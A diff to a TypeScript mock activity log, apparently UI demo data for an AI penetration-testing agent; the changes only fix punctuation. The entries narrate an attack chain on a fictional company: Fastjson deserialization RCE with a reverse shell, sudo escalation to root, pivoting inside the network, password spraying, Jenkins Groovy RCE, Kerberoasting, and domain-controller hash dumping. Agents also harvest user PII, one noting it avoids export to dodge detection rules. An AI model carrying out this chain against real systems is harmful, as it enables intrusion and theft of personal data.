+      "Situation escalated: source code, hard-coded internal creds, and Fastjson RCE create new breakthrough; registered g3 to breach DMZ and establish foothold; deploy i6 (fingerprint/CVE mapping) and i7 (trigger RCE); DMZ privilege escalation relies on shell, queued for next round.",
   },
 
   // ── 第 2 轮 · 立足点已建，转内网（2026-07-25 20:25）──
@@ -1432,7 +1432,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:25:18Z"),
     kind: "thinking",
     summary:
-      "Reference lineage: i7 returned fa4 'reverse shell' shell www-data@dmz-web01(10.0.20.15)，Located in DMZ segment; privilege chain returned fa5 'sudo -l matches' NOPASSWD python3 → Privilege escalation to root; fa6 establishes a second NIC directly to internal 10.10.10.0/24. g3’s acceptance (bypass DMZ + foothold) is already satisfied by fa4 + fa6. Verify fa6’s internal reachability first. prove_goal。",
+      "Reference lineage: i7 returned fa4 'reverse shell' shell www-data@dmz-web01(10.0.20.15), Located in DMZ segment; privilege chain returned fa5 'sudo -l matches' NOPASSWD python3 → Privilege escalation to root; fa6 establishes a second NIC directly to internal 10.10.10.0/24. g3’s acceptance (bypass DMZ + foothold) is already satisfied by fa4 + fa6. Verify fa6’s internal reachability first. prove_goal.",
   },
   {
     seq: 1202,
@@ -1441,7 +1441,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    summary: "node_detail(fa6) —— Confirm dual NIC connectivity to internal network",
+    summary: "node_detail(fa6): Confirm dual NIC connectivity to internal network",
   },
   {
     seq: 1203,
@@ -1450,7 +1450,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    summary: "fa6 Evidence：ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(Internal network ping to 10.10.10.10 succeeded, confirming DMZ boundary crossing.",
+    summary: "fa6 Evidence: ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(Internal network ping to 10.10.10.10 succeeded, confirming DMZ boundary crossing.",
   },
   {
     seq: 1204,
@@ -1461,7 +1461,7 @@ export const activity: Activity[] = [
     tool_use_id: "p2-pg",
     summary: "prove_goal(g3, evidence=fa6)",
     detail:
-      "reason：i7 RCE Obtained DMZ foothold (fa4), escalated to root via fa5, and fa6 proved second NIC direct to internal network and pinged DC01 – acceptance of “bypass DMZ and establish internal foothold” achieved.。",
+      "reason: i7 RCE Obtained DMZ foothold (fa4), escalated to root via fa5, and fa6 proved second NIC direct to internal network and pinged DC01: acceptance of “bypass DMZ and establish internal foothold” achieved.",
   },
   {
     seq: 1205,
@@ -1470,7 +1470,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p2-pg",
-    summary: "goal g3 → met（Evidence: fa6 connected; g1/g2/g4 still pending, task continues",
+    summary: "goal g3 → met (Evidence: fa6 connected; g1/g2/g4 still pending, task continues",
   },
   {
     seq: 1206,
@@ -1479,9 +1479,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p2-ai",
-    summary: "add_intent × 4（Use foothold as pivot for internal lateral movement）",
+    summary: "add_intent × 4 (Use foothold as pivot for internal lateral movement)",
     detail:
-      "intents=[\n  { summary: 'Use dmz-web01 as pivot to discover hosts and identify ports on internal network 10.10.10.0/24', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: 'Internal lateral movement: reuse hard‑coded credentials sa/Acme@2021 Perform credential reuse and password spraying', parent_ids: [faCreds], priority: 8 },\n  { summary: 'Use dmz‑web01 as pivot for internal host/port discovery (10.10.10.0/24); lateral moves: reuse hard‑coded sa/Acme@2021 for credential reuse & password spraying, unauthorized Groovy RCE on Jenkins (10.10.10.20), and Kerberoasting domain service accounts. Host discovery first, other three run in parallel.(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: 'Kerberoasting domain service accounts and offline cracking', parent_ids: [fa6], priority: 8 },\n]\nUse dmz‑web01 as pivot for internal host/port discovery (10.10.10.0/24); lateral moves: reuse hard‑coded sa/Acme@2021 for credential reuse & password spraying, unauthorized Groovy RCE on Jenkins (10.10.10.20), and Kerberoasting domain service accounts. Host discovery first, other three run in parallel.。",
+      "intents=[\n  { summary: 'Use dmz-web01 as pivot to discover hosts and identify ports on internal network 10.10.10.0/24', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: 'Internal lateral movement: reuse hard-coded credentials sa/Acme@2021 Perform credential reuse and password spraying', parent_ids: [faCreds], priority: 8 },\n  { summary: 'Use dmz-web01 as pivot for internal host/port discovery (10.10.10.0/24); lateral moves: reuse hard-coded sa/Acme@2021 for credential reuse & password spraying, unauthorized Groovy RCE on Jenkins (10.10.10.20), and Kerberoasting domain service accounts. Host discovery first, other three run in parallel.(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: 'Kerberoasting domain service accounts and offline cracking', parent_ids: [fa6], priority: 8 },\n]\nUse dmz-web01 as pivot for internal host/port discovery (10.10.10.0/24); lateral moves: reuse hard-coded sa/Acme@2021 for credential reuse & password spraying, unauthorized Groovy RCE on Jenkins (10.10.10.20), and Kerberoasting domain service accounts. Host discovery first, other three run in parallel.",
   },
   {
     seq: 1207,
@@ -1498,7 +1498,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:26:20Z"),
     kind: "text",
     summary:
-      "g3 Attack surface shifted from external to internal network; register g4 “internal lateral – capture DC01”, launch i9 (host discovery) plus i10/i11/i12 in parallel. Credential reuse anchored on faCreds – leaked external credentials fed to internal lateral.。",
+      "g3 Attack surface shifted from external to internal network; register g4 “internal lateral: capture DC01”, launch i9 (host discovery) plus i10/i11/i12 in parallel. Credential reuse anchored on faCreds: leaked external credentials fed to internal lateral.",
   },
 
   // ── 第 3 轮 · 靶标达成复盘（2026-07-26 00:25）──
@@ -1509,7 +1509,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:25:16Z"),
     kind: "thinking",
     summary:
-      "Compare with this round's worker output：i9→fa7「Internal network alive DC01/FS01/JENKINS」；i11→fa8「Jenkins /script Unauthenticated Groovy execution + fa9: export plaintext acme\svc_deploy credential from Jenkins credential store. acme\\svc_deploy Plaintext password」；i12→fa10「Kerberoast svc_sql TGS，hashcat Breakout Sql@2020」。svc_deploy Domain Admins – i13 used psexec to compromise DC01 and run secretsdump. Verify evidence chain before sign‑off。",
+      "Compare with this round's worker output: i9→fa7 “Internal network alive DC01/FS01/JENKINS”; i11→fa8 “Jenkins /script Unauthenticated Groovy execution + fa9: export plaintext acme\svc_deploy credential from Jenkins credential store. acme\\svc_deploy Plaintext password”; i12→fa10 “Kerberoast svc_sql TGS, hashcat Breakout Sql@2020”. svc_deploy Domain Admins: i13 used psexec to compromise DC01 and run secretsdump. Verify evidence chain before sign-off.",
   },
   {
     seq: 1302,
@@ -1518,7 +1518,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "list_findings",
     tool_use_id: "p3-lf",
-    summary: "list_findings —— Verify DC01 compromise evidence",
+    summary: "list_findings: Verify DC01 compromise evidence",
   },
   {
     seq: 1303,
@@ -1528,7 +1528,7 @@ export const activity: Activity[] = [
     tool: "list_findings",
     tool_use_id: "p3-lf",
     summary:
-      "F-09「DC01 full control / secretsdump exported full‑domain hash (critical evidence)：psexec svc_deploy@10.10.10.10 + NTDS.dit dump）；Upstream chain fa9→fa10→i13 Complete",
+      "F-09 “DC01 full control / secretsdump exported full-domain hash (critical evidence): psexec svc_deploy@10.10.10.10 + NTDS.dit dump); Upstream chain fa9→fa10→i13 Complete",
   },
   {
     seq: 1304,
@@ -1539,7 +1539,7 @@ export const activity: Activity[] = [
     tool_use_id: "p3-pg",
     summary: "prove_goal(g4, evidence=F-09)",
     detail:
-      "reason：Jenkins Leak svc_deploy(Domain Admin) → psexec Control DC01 → secretsdump Full‑domain hash confirmed by F‑09; “internal target DC01 compromised” achieved。",
+      "reason: Jenkins Leak svc_deploy(Domain Admin) → psexec Control DC01 → secretsdump Full-domain hash confirmed by F-09; “internal target DC01 compromised” achieved.",
   },
   {
     seq: 1305,
@@ -1548,7 +1548,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p3-pg",
-    summary: "goal g4 → met；System notice: g2 still open, not the final target, task not fully completed",
+    summary: "goal g4 → met; System notice: g2 still open, not the final target, task not fully completed",
   },
   {
     seq: 1306,
@@ -1556,7 +1556,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:26:10Z"),
     kind: "text",
     summary:
-      "g4 Finalize – internal and external network link fully established (external) RCE → DMZ → Internal network → Compare uncovered directions: g2 “Read user sensitive data” still lacks final step, though i3 (backend UI) and i5 (API IDOR) already cover it and are running. No new uncovered direction this round – set intent to zero and wait for i3/i5 output.。",
+      "g4 Finalize: internal and external network link fully established (external) RCE → DMZ → Internal network → Compare uncovered directions: g2 “Read user sensitive data” still lacks final step, though i3 (backend UI) and i5 (API IDOR) already cover it and are running. No new uncovered direction this round: set intent to zero and wait for i3/i5 output.",
   },
 
   // ── 第 4 轮 · 后台达成，收敛 g2（2026-07-26 03:55）──
@@ -1573,7 +1573,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:14Z"),
     kind: "thinking",
     summary:
-      "Recent facts: work#2 used Acme@2021 from faCreds to compromise admin backend (i2 done), gaining admin rights – g1 accepted. Quantitative check on g2 “Read user sensitive data” shows only interface probing (i3/i5) with no bulk data; fail. Prohibit proving goal, raise priority to fulfill data extraction. Acme@2021 Compromised admin backend (i2 done); admin rights obtained—g1 acceptance met, stamp prove_goal. Then quantitative check: g2 “Read user sensitive data“ only i3/i5 reached interface, no bulk data yet; fails, forbid prove_goal, raise priority to complete data extraction。",
+      "Recent facts: work#2 used Acme@2021 from faCreds to compromise admin backend (i2 done), gaining admin rights: g1 accepted. Quantitative check on g2 “Read user sensitive data” shows only interface probing (i3/i5) with no bulk data; fail. Prohibit proving goal, raise priority to fulfill data extraction. Acme@2021 Compromised admin backend (i2 done); admin rights obtained; g1 acceptance met, stamp prove_goal. Then quantitative check: g2 “Read user sensitive data” only i3/i5 reached interface, no bulk data yet; fails, forbid prove_goal, raise priority to complete data extraction.",
   },
   {
     seq: 1402,
@@ -1584,7 +1584,7 @@ export const activity: Activity[] = [
     tool_use_id: "p4-pg",
     summary: "prove_goal(g1, evidence=fa1)",
     detail:
-      "reason：i2 Use hard-coded password leaked on external network Acme@2021 Successfully logged into admin backend (Element-UI); admin privileges obtained, g1 achieved。",
+      "reason: i2 Use hard-coded password leaked on external network Acme@2021 Successfully logged into admin backend (Element-UI); admin privileges obtained, g1 achieved.",
   },
   {
     seq: 1403,
@@ -1593,7 +1593,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p4-pg",
-    summary: "goal g1 → met；Remaining unmet：g2",
+    summary: "goal g1 → met; Remaining unmet: g2",
   },
   {
     seq: 1404,
@@ -1601,7 +1601,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:40Z"),
     kind: "thinking",
     summary:
-      "g2 Quantitative check: target ‘Read user sensitive data’ requires bulk user records. No “Successfully exported user data” finding; i3/i5 running without results – test fails. Do not mark as met; continue assigning intent to bridge the gap.。",
+      "g2 Quantitative check: target ‘Read user sensitive data’ requires bulk user records. No “Successfully exported user data” finding; i3/i5 running without results: test fails. Do not mark as met; continue assigning intent to bridge the gap.",
   },
   {
     seq: 1405,
@@ -1610,7 +1610,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p4-ai",
-    summary: "add_intent × 2（Converge g2 data collection and raise its priority.）",
+    summary: "add_intent × 2 (Converge g2 data collection and raise its priority.)",
     detail:
       "intents=[\n  { summary: 'Logged into admin backend, enumerated user management/export interfaces and batch retrieved user sensitive fields', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com order IDOR iterated order_id to batch retrieve user orders/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nNote: i3/i5 are already running; this round uses more precise data retrieval descriptions + raises priority (→9) for added emphasis, without assigning duplicate synonymous intents.",
   },
@@ -1621,7 +1621,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p4-ai",
-    summary: "2 intents updated → ids=[i3, i5]（Priority raised to 9; description refined to 'batch data collection'.』）",
+    summary: "2 intents updated → ids=[i3, i5](priority raised to 9; description refined to 'batch data collection')",
   },
   {
     seq: 1407,
@@ -1629,7 +1629,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:58Z"),
     kind: "text",
     summary:
-      "g1 Achieved (3/4 met: g1, g3, g4). g2 requires quantitative acceptance—backend entry alone isn’t enough; must obtain batch user data. i3/i5 set to priority 9 with data‑collection intent; await worker response to finish task.。",
+      "g1 Achieved (3/4 met: g1, g3, g4). g2 requires quantitative acceptance; backend entry alone isn’t enough; must obtain batch user data. i3/i5 set to priority 9 with data-collection intent; await worker response to finish task.",
   },
 
   // work#1 · i1 子域枚举与端口扫描（done）
@@ -1639,7 +1639,7 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:20:00Z"),
     kind: "thinking",
-    summary: "First perform passive subdomain reconnaissance, then conduct port/service detection on live hosts.。",
+    summary: "First perform passive subdomain reconnaissance, then conduct port/service detection on live hosts.",
   },
   {
     seq: 11,
@@ -1661,7 +1661,7 @@ export const activity: Activity[] = [
     tool_use_id: "t11",
     summary:
       "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin Log in\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
-    detail: "5 Live subdomains, with admin as the backend login page.。",
+    detail: "5 Live subdomains, with admin as the backend login page.",
   },
   {
     seq: 13,
@@ -1682,7 +1682,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12",
     summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
-    detail: "Open 22/80/443。",
+    detail: "Open 22/80/443.",
   },
   {
     seq: 15,
@@ -1692,7 +1692,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "upsert_asset",
     tool_use_id: "t13",
-    summary: "upsert_asset × 6（Subdomains + services）",
+    summary: "upsert_asset × 6 (Subdomains + services)",
   },
   {
     seq: 16,
@@ -1710,7 +1710,7 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:40:00Z"),
     kind: "result",
-    summary: "Asset reconnaissance completed; backend admin.acme.com found, return diagram。",
+    summary: "Asset reconnaissance completed; backend admin.acme.com found, return diagram.",
     input_tokens: 96000,
     output_tokens: 6100,
     cache_read_tokens: 61000,
@@ -1724,7 +1724,7 @@ export const activity: Activity[] = [
     intent_id: "i2",
     ts: T("2026-07-26T03:31:00Z"),
     kind: "thinking",
-    summary: "Backend uses Element-UI; login API has no captcha or rate limiting. Try default credential list first, then dictionary。",
+    summary: "Backend uses Element-UI; login API has no captcha or rate limiting. Try default credential list first, then dictionary.",
   },
   {
     seq: 21,
@@ -1745,7 +1745,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t21",
     summary: "401",
-    detail: "admin/admin Failed。",
+    detail: "admin/admin Failed.",
   },
   {
     seq: 23,
@@ -1766,7 +1766,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t22",
     summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
-    detail: "admin/admin123 Login successful, session obtained cookie。",
+    detail: "admin/admin123 Login successful, session obtained cookie.",
   },
   {
     seq: 25,
@@ -1787,7 +1787,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t23",
     summary: "<title>Acme Admin · Console",
-    detail: "Confirm entered admin console。",
+    detail: "Confirm entered admin console.",
   },
   {
     seq: 27,
@@ -1807,7 +1807,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t24",
-    summary: "finding f-6 Recorded and connected to target g1（proves）",
+    summary: "finding f-6 Recorded and connected to target g1 (proves)",
   },
   {
     seq: 29,
@@ -1815,7 +1815,7 @@ export const activity: Activity[] = [
     intent_id: "i2",
     ts: T("2026-07-26T03:50:00Z"),
     kind: "result",
-    summary: "Confirm default admin password, target①Achieved。",
+    summary: "Confirm default admin password, target①Achieved.",
     input_tokens: 72000,
     output_tokens: 4800,
     cache_read_tokens: 48000,
@@ -1829,7 +1829,7 @@ export const activity: Activity[] = [
     intent_id: "i4",
     ts: T("2026-07-25T22:01:00Z"),
     kind: "thinking",
-    summary: "search?q= On result page, concatenate q into title; manually add single quotes to see error。",
+    summary: "search?q= On result page, concatenate q into title; manually add single quotes to see error.",
   },
   {
     seq: 41,
@@ -1850,7 +1850,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t41",
     summary: "Unclosed quotation mark ... near '1'.",
-    detail: "MSSQL Error-based injection indicator。",
+    detail: "MSSQL Error-based injection indicator.",
   },
   {
     seq: 43,
@@ -1872,7 +1872,7 @@ export const activity: Activity[] = [
     tool_use_id: "t42",
     summary:
       "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
-    detail: "Confirm injectable, enumerated 4 libraries。",
+    detail: "Confirm injectable, enumerated 4 libraries.",
   },
   {
     seq: 45,
@@ -1900,7 +1900,7 @@ export const activity: Activity[] = [
     intent_id: "i4",
     ts: T("2026-07-26T01:20:00Z"),
     kind: "result",
-    summary: "SQL Injection Confirmation。",
+    summary: "SQL Injection Confirmation.",
     input_tokens: 118000,
     output_tokens: 7400,
     cache_read_tokens: 82000,
@@ -1914,7 +1914,7 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T02:31:00Z"),
     kind: "thinking",
-    summary: "/v1/orders?id= Numeric auto‑increment ID, typical IDOR scenario. Retrieve own order, then modify ID to see if others can be accessed.。",
+    summary: "/v1/orders?id= Numeric auto-increment ID, typical IDOR scenario. Retrieve own order, then modify ID to see if others can be accessed.",
   },
   {
     seq: 51,
@@ -1935,7 +1935,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t51",
     summary: '{ "order_id":1001, "user_id":42, "amount":299 }',
-    detail: "Own order (normal)。",
+    detail: "Own order (normal).",
   },
   {
     seq: 53,
@@ -1956,7 +1956,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t52",
     summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"Chaoyang District, Beijing ****" }',
-    detail: "Unauthorized read of others' orders (including phone/address), no ownership check。",
+    detail: "Unauthorized read of others' orders (including phone/address), no ownership check.",
   },
   {
     seq: 55,
@@ -1984,7 +1984,7 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T03:58:10Z"),
     kind: "thinking",
-    summary: "Batch iterating ID range to assess potential over‑privileged data volume (no export yet to avoid detection rules）。",
+    summary: "Batch iterating ID range to assess potential over-privileged data volume (no export yet to avoid detection rules).",
   },
 
   // work#3 · i3 后台用户接口枚举（running）
@@ -1994,7 +1994,7 @@ export const activity: Activity[] = [
     intent_id: "i3",
     ts: T("2026-07-26T03:56:00Z"),
     kind: "thinking",
-    summary: "Existing admin session, enumerate management APIs to locate bulk export of sensitive user data (target②）。",
+    summary: "Existing admin session, enumerate management APIs to locate bulk export of sensitive user data (target②).",
   },
   {
     seq: 61,
@@ -2015,7 +2015,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t61",
     summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
-    detail: "Management API returns all users (email/phone) paginated, ~12.8k entries。",
+    detail: "Management API returns all users (email/phone) paginated, ~12.8k entries.",
   },
   {
     seq: 63,
@@ -2023,7 +2023,7 @@ export const activity: Activity[] = [
     intent_id: "i3",
     ts: T("2026-07-26T03:58:20Z"),
     kind: "thinking",
-    summary: "Confirmed bulk user data read endpoint; export triggers destructive/leak rule, submitted for interception approval awaiting release。",
+    summary: "Confirmed bulk user data read endpoint; export triggers destructive/leak rule, submitted for interception approval awaiting release.",
   },
 
   // workG · ig .git 源码泄露与硬编码凭据（done）
@@ -2033,7 +2033,7 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:26:00Z"),
     kind: "thinking",
-    summary: "robots.txt Reference to /.git – first check if directory is downloadable; source code enables white‑box search for injection points and hard‑coded keys。",
+    summary: "robots.txt Reference to /.git: first check if directory is downloadable; source code enables white-box search for injection points and hard-coded keys.",
   },
   {
     seq: 311,
@@ -2054,7 +2054,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg1",
     summary: "200",
-    detail: ".git Directory publicly accessible。",
+    detail: ".git Directory publicly accessible.",
   },
   {
     seq: 313,
@@ -2074,8 +2074,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg2",
-    summary: "Restore 214 files; HEAD=main. config.php / db.php pending。",
-    detail: "Full backend source code restored to /tmp/acme。",
+    summary: "Restore 214 files; HEAD=main. config.php / db.php pending.",
+    detail: "Full backend source code restored to /tmp/acme.",
   },
   {
     seq: 315,
@@ -2096,7 +2096,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg3",
     summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
-    detail: "Hard‑coded DB credentials; host points to internal IP – marked as suspected internal shared credential。",
+    detail: "Hard-coded DB credentials; host points to internal IP: marked as suspected internal shared credential.",
   },
   {
     seq: 317,
@@ -2104,7 +2104,7 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:36:00Z"),
     kind: "result",
-    summary: "Source code leak + hard‑coded DB credentials confirmed; credentials added to diagram for later internal reuse。",
+    summary: "Source code leak + hard-coded DB credentials confirmed; credentials added to diagram for later internal reuse.",
     input_tokens: 88000,
     output_tokens: 5200,
     cache_read_tokens: 60000,
@@ -2118,7 +2118,7 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:22:00Z"),
     kind: "thinking",
-    summary: "shop.acme.com Self‑developed e‑commerce; fingerprint framework/component versions, then target known deserialization‑vulnerable components。",
+    summary: "shop.acme.com Self-developed e-commerce; fingerprint framework/component versions, then target known deserialization-vulnerable components.",
   },
   {
     seq: 321,
@@ -2139,7 +2139,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6a",
     summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
-    detail: "Java Tech stack includes /api/import endpoint JSON body。",
+    detail: "Java Tech stack includes /api/import endpoint JSON body.",
   },
   {
     seq: 323,
@@ -2160,8 +2160,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t6b",
-    summary: "Error stack contains com.alibaba.fastjson.JSONException（1.2.24）",
-    detail: "Confirmed Fastjson 1.2.24 – corresponds to JdbcRowSetImpl JNDI injection RCE。",
+    summary: "Error stack contains com.alibaba.fastjson.JSONException (1.2.24)",
+    detail: "Confirmed Fastjson 1.2.24: corresponds to JdbcRowSetImpl JNDI injection RCE.",
   },
   {
     seq: 325,
@@ -2169,7 +2169,7 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:40:00Z"),
     kind: "result",
-    summary: "Fingerprint matches Fastjson 1.2.24; deserialization RCE viable, handed over for exploit development。",
+    summary: "Fingerprint matches Fastjson 1.2.24; deserialization RCE viable, handed over for exploit development.",
     input_tokens: 64000,
     output_tokens: 4100,
     cache_read_tokens: 42000,
@@ -2183,7 +2183,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:12:00Z"),
     kind: "thinking",
-    summary: "Deploy malicious JNDI/LDAP service; shop performs callback to load payload, verify outbound via dnslog, then obtain reverse shell shell。",
+    summary: "Deploy malicious JNDI/LDAP service; shop performs callback to load payload, verify outbound via dnslog, then obtain reverse shell shell.",
   },
   {
     seq: 331,
@@ -2204,7 +2204,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7a",
     summary: "LDAP Server started on 1389, HTTP on 8180",
-    detail: "Malicious service ready。",
+    detail: "Malicious service ready.",
   },
   {
     seq: 333,
@@ -2226,7 +2226,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7b",
     summary: "LDAP Request received → Loading ReverseShell → nc Listening for incoming connection",
-    detail: "payload Trigger successful。",
+    detail: "payload Trigger successful.",
   },
   {
     seq: 335,
@@ -2247,7 +2247,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7c",
     summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
-    detail: "www-data@dmz-web01，Second NIC 10.10.10.x – inside DMZ but adjacent to internal network。",
+    detail: "www-data@dmz-web01, Second NIC 10.10.10.x: inside DMZ but adjacent to internal network.",
   },
   {
     seq: 337,
@@ -2265,7 +2265,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:40:00Z"),
     kind: "result",
-    summary: "Deserialization RCE yields www‑data reverse shell, target③Foothold initially established。",
+    summary: "Deserialization RCE yields www-data reverse shell, target③Foothold initially established.",
     input_tokens: 132000,
     output_tokens: 8600,
     cache_read_tokens: 90000,
@@ -2279,7 +2279,7 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:02:00Z"),
     kind: "thinking",
-    summary: "www-data Limited privileges; first gather local info for privilege escalation: sudo config, SUID binaries, kernel version。",
+    summary: "www-data Limited privileges; first gather local info for privilege escalation: sudo config, SUID binaries, kernel version.",
   },
   {
     seq: 341,
@@ -2300,7 +2300,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8a",
     summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
-    detail: "sudo Python 3 whitelisted with passwordless sudo – immediate privilege escalation possible。",
+    detail: "sudo Python 3 whitelisted with passwordless sudo: immediate privilege escalation possible.",
   },
   {
     seq: 343,
@@ -2321,7 +2321,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8b",
     summary: "uid=0(root) gid=0(root) groups=0(root)",
-    detail: "Privilege escalated root。",
+    detail: "Privilege escalated root.",
   },
   {
     seq: 345,
@@ -2339,7 +2339,7 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:20:00Z"),
     kind: "result",
-    summary: "Local root escalation complete, foothold solidified; preparing to pivot into internal network。",
+    summary: "Local root escalation complete, foothold solidified; preparing to pivot into internal network.",
     input_tokens: 74000,
     output_tokens: 4700,
     cache_read_tokens: 50000,
@@ -2353,7 +2353,7 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T20:32:00Z"),
     kind: "thinking",
-    summary: "Foothold directly connects to 10.10.10.0/24; use fscan/internal scanning for host/port discovery, identify domain controller and high‑value hosts。",
+    summary: "Foothold directly connects to 10.10.10.0/24; use fscan/internal scanning for host/port discovery, identify domain controller and high-value hosts.",
   },
   {
     seq: 351,
@@ -2374,7 +2374,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t9a",
     summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
-    detail: "Identified domain controller DC01, file server FS01, internal assets Jenkins。",
+    detail: "Identified domain controller DC01, file server FS01, internal assets Jenkins.",
   },
   {
     seq: 353,
@@ -2382,7 +2382,7 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T21:00:00Z"),
     kind: "result",
-    summary: "Internal host discovery complete; three high‑value targets added to map。",
+    summary: "Internal host discovery complete; three high-value targets added to map.",
     input_tokens: 82000,
     output_tokens: 5100,
     cache_read_tokens: 56000,
@@ -2396,7 +2396,7 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:42:00Z"),
     kind: "thinking",
-    summary: "Source code leaked sa/Acme@2021 DB credential found; common enterprise password reuse. Perform password spraying against DC01/FS01/JENKINS。",
+    summary: "Source code leaked sa/Acme@2021 DB credential found; common enterprise password reuse. Perform password spraying against DC01/FS01/JENKINS.",
   },
   {
     seq: 361,
@@ -2417,7 +2417,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t10a",
     summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] Authentication failed",
-    detail: "FS01 SA credential reuse succeeded with admin rights; DC01 unreachable。",
+    detail: "FS01 SA credential reuse succeeded with admin rights; DC01 unreachable.",
   },
   {
     seq: 363,
@@ -2435,7 +2435,7 @@ export const activity: Activity[] = [
     intent_id: "i11",
     ts: T("2026-07-25T21:32:00Z"),
     kind: "thinking",
-    summary: "JENKINS 8080 Directly accessible; first check if /script console requires authentication。",
+    summary: "JENKINS 8080 Directly accessible; first check if /script console requires authentication.",
   },
   {
     seq: 371,
@@ -2456,7 +2456,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11a",
     summary: "200",
-    detail: "Script Console Accessible without login。",
+    detail: "Script Console Accessible without login.",
   },
   {
     seq: 373,
@@ -2477,7 +2477,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11b",
     summary: "nt authority\\system",
-    detail: "Groovy Executed with SYSTEM privileges。",
+    detail: "Groovy Executed with SYSTEM privileges.",
   },
   {
     seq: 375,
@@ -2498,7 +2498,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11c",
